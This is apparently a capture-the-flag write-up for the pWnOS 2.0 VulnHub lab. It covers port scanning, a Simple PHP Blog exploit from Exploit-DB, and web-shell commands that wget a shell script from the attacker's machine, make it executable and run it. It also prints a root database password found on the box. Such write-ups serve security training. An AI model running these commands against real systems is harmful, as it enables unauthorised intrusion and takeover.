<h1>pWnOS: 2.0 Write-up</h1>

<h2>Nmap</h2>

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
```

<h3>PORT 80</h3>

Found /blog  using gobuster

whatweb revels **Simple Php Blog 0.4.0** is running 

Exploit : https://www.exploit-db.com/exploits/1191

```./1191.pl -h http://192.168.56.36/blog -e 1```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/pWnOS%3A%202.0/Images/exploit.png)

**Execute Commands :**

```
http://192.168.56.36/blog/images/cmd.php?cmd=whoami
http://192.168.56.36/blog/images/cmd.php?cmd=wget http://192.168.56.1/shell.sh -O /tmp/shell.sh
http://192.168.56.36/blog/images/cmd.php?cmd=chmod%20777%20/tmp/shell.sh
http://192.168.56.36/blog/images/cmd.php?cmd=/tmp/shell.sh
```
![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/pWnOS%3A%202.0/Images/shell.png)


<h2>Privilege Escalation : </h2>

on /var there is a file named mysqli_connect.php which contains root password

```
username : root 
password : root@ISIntS
```
